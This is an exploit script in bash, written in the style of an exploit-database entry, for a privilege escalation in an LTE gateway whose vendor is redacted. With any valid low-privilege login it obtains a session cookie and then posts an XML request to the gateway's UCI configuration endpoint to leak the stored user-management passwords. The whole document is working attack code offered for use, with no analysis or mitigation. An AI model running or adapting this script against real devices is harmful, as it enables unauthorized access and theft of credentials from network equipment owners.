# Exploit Title: [[REDCATED]] LTE Gateway LPE
# Google Dork: [[REDCATED]] Web Server Vulnerability Allows User Role Privilege Escalation
# Date: 21.06.2021
# Exploit Author: dreizehnutters
# Version: [[REDCATED]]
# Tested on: [[REDCATED]]
# CVE: ???

#!/bin/bash

if [[ $# -lt 3 ]]; then
  echo "Usage: $0 <IP> <USERNAME> <PASSWORD>"
  exit 1
fi
target=$1
user=$2
pass=$3

# stage 1
echo "[*] baking login cookie"
RESP=$(curl -i -s -k -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary "username=${user}&password=${pass}&submit=LOGIN\x09" \
    "http://${target}/action/weblogin")

COOKIE=$(echo "$RESP" | grep Cookie| tr ' ' '\n' | head -n 2 | tail -1 | tr '\-=' '\n' | tail -1 | sed 's/;//g')

# stage 2
echo "[*] trying to leak passwords"

# XML payload
gen_payload(){
    cat <<EOF
getmsg=<?xml version="1.0" encoding="UTF-8"?>
<config_xml><user_management></user_management></config_xml>&hash=$COOKIE
EOF
}

curl -s -k -X POST \
    -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
    -b "-goahead-session-=${COOKIE}" \
    --data-binary "$(gen_payload)" \
    "https://${target}/ajax/webs_uci_get/"